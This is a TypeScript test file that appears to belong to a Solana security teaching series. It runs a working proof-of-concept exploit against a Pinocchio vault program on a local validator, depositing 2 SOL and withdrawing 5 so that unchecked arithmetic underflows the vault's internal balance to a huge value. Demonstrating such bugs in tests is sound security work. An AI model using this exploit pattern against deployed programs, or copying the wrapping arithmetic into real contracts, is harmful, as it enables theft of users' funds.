/**
 * EXPLOIT TEST: Arithmetic Overflow (Pinocchio)
 * 
 * This test demonstrates the arithmetic overflow/underflow vulnerability in the Pinocchio program.
 * 
 * Vulnerability: The program uses manual byte arithmetic that wraps on overflow/underflow.
 * 
 * Exploit Scenario:
 * 1. Initialize vault.
 * 2. Deposit small amount.
 * 3. Withdraw larger amount -> Underflow -> Huge balance.
 */

import {
    Connection,
    Keypair,
    PublicKey,
    Transaction,
    TransactionInstruction,
    LAMPORTS_PER_SOL,
    sendAndConfirmTransaction,
} from "@solana/web3.js";
import { BN } from "bn.js";

describe("03-arithmetic-overflow: Pinocchio Exploit", () => {
    const connection = new Connection("http://localhost:8899", "confirmed");
    const PROGRAM_ID = new PublicKey("3Z9vL1zjN4N5tRDNEPQuv876tMB1qdNGo4B2PqJdZZXR");

    // Instruction discriminators
    const INITIALIZE_DISCRIMINATOR = 0;
    const DEPOSIT_DISCRIMINATOR = 1;
    const WITHDRAW_DISCRIMINATOR = 2;

    // Manual layout offsets
    const BALANCE_OFFSET = 32;

    it("Exploits arithmetic underflow to create massive balance", async () => {
        console.log("\nðŸŽ¯ EXPLOIT: Arithmetic Overflow (Pinocchio)\n");

        const user = Keypair.generate();
        console.log("ðŸ‘¤ User:", user.publicKey.toBase58());

        // Airdrop SOL
        const airdropSig = await connection.requestAirdrop(
            user.publicKey,
            10 * LAMPORTS_PER_SOL
        );
        await connection.confirmTransaction(airdropSig);

        // Derive vault PDA
        const [vaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), user.publicKey.toBuffer()],
            PROGRAM_ID
        );
        console.log("ðŸ¦ Vault PDA:", vaultPda.toBase58());

        // Step 1: Initialize
        console.log("\nðŸ“ Step 1: Initialize vault...");
        const initIx = new TransactionInstruction({
            keys: [
                { pubkey: user.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
            ],
            programId: PROGRAM_ID,
            data: Buffer.from([INITIALIZE_DISCRIMINATOR]),
        });
        await sendAndConfirmTransaction(connection, new Transaction().add(initIx), [user]);

        // Step 2: Deposit 2 SOL
        const depositLambda = 2 * LAMPORTS_PER_SOL;
        console.log(`\nðŸ’° Step 2: Deposit 2 SOL...`);
        const depositData = Buffer.alloc(9);
        depositData.writeUInt8(DEPOSIT_DISCRIMINATOR, 0);
        depositData.writeBigUInt64LE(BigInt(depositLambda), 1);

        const depositIx = new TransactionInstruction({
            keys: [
                { pubkey: user.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
            ],
            programId: PROGRAM_ID,
            data: depositData,
        });
        await sendAndConfirmTransaction(connection, new Transaction().add(depositIx), [user]);

        // Read balance
        let accountInfo = await connection.getAccountInfo(vaultPda);
        let balance = accountInfo.data.readBigUInt64LE(BALANCE_OFFSET);
        console.log(`âœ… Vault internal balance: ${balance}`);

        // Fund vault manually to pass system checks
        const fundSig = await connection.requestAirdrop(
            vaultPda,
            10 * LAMPORTS_PER_SOL
        );
        await connection.confirmTransaction(fundSig);

        // Step 3: Withdraw 5 SOL (Underflow)
        const withdrawLambda = 5 * LAMPORTS_PER_SOL;
        console.log(`\nðŸš¨ Step 3: Withdraw 5 SOL (causing underflow)...`);

        const withdrawData = Buffer.alloc(9);
        withdrawData.writeUInt8(WITHDRAW_DISCRIMINATOR, 0);
        withdrawData.writeBigUInt64LE(BigInt(withdrawLambda), 1);

        const withdrawIx = new TransactionInstruction({
            keys: [
                { pubkey: user.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
            ],
            programId: PROGRAM_ID,
            data: withdrawData,
        });
        await sendAndConfirmTransaction(connection, new Transaction().add(withdrawIx), [user]);

        // Step 4: Verify huge balance
        accountInfo = await connection.getAccountInfo(vaultPda);
        balance = accountInfo.data.readBigUInt64LE(BALANCE_OFFSET);
        console.log(`\nðŸ’¥ EXPLOIT SUCCESSFUL!`);
        console.log(`ðŸ¦ Vault internal balance: ${balance}`);

        if (balance > BigInt(1000 * LAMPORTS_PER_SOL)) {
            console.log("âœ… Balance is massive (underflow confirmed)");
        } else {
            throw new Error("Underflow did not occur");
        }
    });
});
